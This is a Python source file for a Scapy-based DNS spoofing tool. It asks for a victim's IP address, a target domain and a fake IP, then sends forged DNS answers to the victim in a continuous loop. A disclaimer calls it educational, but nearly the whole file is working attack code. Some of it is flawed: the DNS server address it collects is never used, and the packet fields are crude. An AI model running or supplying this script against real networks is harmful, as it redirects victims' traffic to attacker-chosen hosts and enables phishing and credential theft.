from scapy.all import *
import time
import random
import signal
import sys

# Function to handle CTRL+C gracefully
def signal_handler(sig, frame):
    print("\n[!] Stopping the DNS Spoofing Simulation...")
    sys.exit(0)

# Register the signal handler
signal.signal(signal.SIGINT, signal_handler)

def dns_spoof(victim_ip, dns_server_ip, domain, fake_ip):
    """
    Simulates DNS Spoofing attack by continuously sending forged DNS responses.
    """
    print("\n[*] DNS Spoofing attack started. Press CTRL+C to stop.")
    try:
        while True:
            # Craft a DNS response with a fake IP
            dns_response = IP(dst=victim_ip)/UDP(dport=53)/DNS(id=random.randint(1, 65535), qr=1, 
                                                      qd=DNSQR(qname=domain, qtype="A"), 
                                                      an=DNSRR(rrname=domain, ttl=10, rdata=fake_ip))
            
            # Send the fake DNS response to the victim
            send(dns_response, verbose=0)
            
            # Print status update
            print(f"[*] Spoofed {domain} -> {fake_ip} for victim {victim_ip}")

            # Sleep to avoid excessive flooding (adjust as needed)
            time.sleep(2)

    except Exception as e:
        print(f"[!] Error during spoofing: {e}")

def main():
    # Display disclaimer
    print("===================================")
    print("Disclaimer: This tool is for educational and ethical purposes only.")
    print("By running this tool, you agree not to use it for malicious activities.")
    print("Any illegal use of this tool is the sole responsibility of the user.")
    print("===================================")
    print("\nTool developed by: Sujal Lamichhane\n")
    time.sleep(2)

    print("Proceeding with the DNS Spoofing Simulation Tool...\n")
    time.sleep(2)

    # Ask user for the victim's IP address, default gateway, and domain details
    victim_ip = input("Enter Victim's IP Address: ")
    dns_server_ip = input("Enter DNS Server's IP Address (Default Gateway): ")
    domain = input("Enter Domain to Spoof (e.g., www.example.com): ")
    fake_ip = input("Enter Fake IP Address to Redirect to (e.g., 192.168.1.100): ")

    # Check for empty inputs and handle errors
    if not victim_ip or not dns_server_ip or not domain or not fake_ip:
        print("[!] Error: All fields must be filled. Please try again.")
        return

    # Simulate DNS Spoofing Attack
    dns_spoof(victim_ip, dns_server_ip, domain, fake_ip)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"[!] An unexpected error occurred: {e}")
